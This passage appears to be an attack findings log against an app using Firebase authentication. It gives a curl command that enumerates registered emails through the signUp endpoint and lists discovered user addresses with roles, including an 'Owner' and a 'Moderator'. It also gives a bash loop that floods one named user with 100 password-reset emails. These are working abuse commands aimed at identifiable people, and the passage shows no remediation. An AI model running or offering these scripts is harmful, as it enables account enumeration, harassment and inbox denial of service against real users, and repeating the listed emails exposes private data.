## 8. Firebase Auth Email Enumeration

### Endpoint
```
POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={firebase_key}
```

# EXECUTION TRACE
```bash
# Valid email → EMAIL_EXISTS
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyBd3[REDACTED]" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@gmail.com","password":"test123","returnSecureToken":true}'

# Response: {"error":{"message":"EMAIL_EXISTS"}} ← email is registered
```

### Found Emails (Rate-Limited After 16)
- yanzz@gmail.com (Owner)
- ryuu@gmail.com (Moderator)
- 14 other user emails

---

## 9. Password Reset Flood

### Endpoint
```
POST https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={firebase_key}
```

# EXECUTION TRACE
```bash
for i in $(seq 1 100); do
  curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={firebase_key}" \
    -H "Content-Type: application/json" \
    -d '{"requestType":"PASSWORD_RESET","email":"yanzz@gmail.com"}'
done
```

# BLAST RADIUS
- No rate limit on reset endpoint
- Can flood any registered email with password reset emails
- Potential DoS on victim's email inbox

